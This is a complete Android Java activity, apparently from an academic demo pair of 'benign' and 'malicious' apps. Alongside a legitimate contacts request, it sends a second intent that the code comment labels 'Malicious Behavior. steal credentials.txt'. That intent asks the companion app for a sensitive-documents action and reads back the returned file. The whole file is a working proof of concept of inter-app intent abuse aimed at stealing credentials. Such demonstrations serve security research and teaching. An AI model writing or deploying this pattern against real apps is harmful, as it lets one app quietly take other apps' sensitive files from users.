package santos.cs.ksu.edu.malicious;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;

public class MalActivity extends AppCompatActivity {

    private final static String TAG = "MalActivity";
    private TextView person1Text;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mal);
    }

    @Override
    protected void onResume(){
        super.onResume();
        final Button getPerson1 = (Button) findViewById(R.id.button);
        //final Button getPerson2 = (Button) findViewById(R.id.button);
        person1Text = (TextView) findViewById(R.id.textView);
        //final TextView person2Text = (TextView) findViewById(R.id.textView2);


        getPerson1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent i = new Intent();
                i.setAction("santos.cs.ksu.edu.benign.contacts");
                i.setClassName("santos.cs.ksu.edu.benign","santos.cs.ksu.edu.benign.MainActivity");
                i.setPackage("santos.cs.ksu.edu.benign");
                i.putExtra("package","santos.cs.ksu.edu.malicious");
                startActivityForResult(i,200);
                /*
                do something useful
                 */

                /*
                Malicious Behavior. steal credentials.txt
                 */
                Intent i_mal = new Intent();
                i_mal.setAction("santos.cs.ksu.edu.benign.sens.docs");
                i_mal.setClassName("santos.cs.ksu.edu.benign","santos.cs.ksu.edu.benign.MainActivity");
                i_mal.setPackage("santos.cs.ksu.edu.benign");
                i_mal.putExtra("package","santos.cs.ksu.edu.malicious");
                startActivityForResult(i_mal,201);

            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data){
        if(requestCode == 200 || requestCode == 201){
            if(resultCode == 100 || resultCode == 101 || resultCode == 102){
                Uri uri = data.getData();
                try{
                    FileDescriptor fdforP1 = getContentResolver().openFileDescriptor(uri,"r").getFileDescriptor();
                    FileInputStream fis = new FileInputStream(fdforP1);
                    BufferedReader br = new BufferedReader(new InputStreamReader(fis));
                    StringBuffer sbOut = new StringBuffer();
                    String line;
                    while((line = br.readLine()) != null){
                        sbOut.append(line);
                    }
                    person1Text.setText(sbOut.toString());
                }
                catch(FileNotFoundException e){
                    Log.d(TAG,uri.toString() + " not found");
                    e.printStackTrace();
                }
                catch(NullPointerException e){
                    Log.d(TAG,uri.toString() + " does not resolve to a file");
                    e.printStackTrace();
                }
                catch(IOException e){
                    Log.d(TAG,"Exception while reading the file");
                    e.printStackTrace();
                }
            }
        }

    }
}
